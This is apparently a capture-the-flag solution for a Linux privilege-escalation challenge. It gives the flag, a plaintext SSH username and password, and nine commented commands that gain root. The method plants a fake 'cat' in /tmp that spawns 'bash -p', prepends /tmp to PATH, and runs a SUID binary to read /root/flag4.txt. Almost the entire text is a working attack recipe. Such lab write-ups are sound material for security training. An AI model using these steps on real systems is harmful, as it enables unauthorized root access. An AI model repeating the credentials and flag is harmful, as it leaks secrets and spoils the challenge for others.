Flag: obsidian{su1d_p4th_h1j4ck_r00t}

ssh credentials:
sysadmin_01
Sup3rS3cr3tSSH!


// 1. Connect to the target server via SSH
ssh sysadmin_01@<TARGET_IP>

// 2. Locate the vulnerable SUID binary
find / -perm -u=s -type f 2>/dev/null

// 3. Navigate to a world-writable directory
cd /tmp

// 4. Create the fake "cat" command to spawn a privileged bash shell
echo "/bin/bash -p" > cat

// 5. Make the fake "cat" binary executable
chmod +x cat

// 6. Hijack the $PATH variable so the system checks /tmp first
export PATH=/tmp:$PATH

// 7. Execute the vulnerable SUID binary (triggers our fake "cat")
/usr/local/bin/<VULN_BINARY_NAME>

// 8. Verify root privileges
whoami

// 9. Read the root flag (using the full path to the real "cat" binary)
/usr/bin/cat /root/flag4.txt
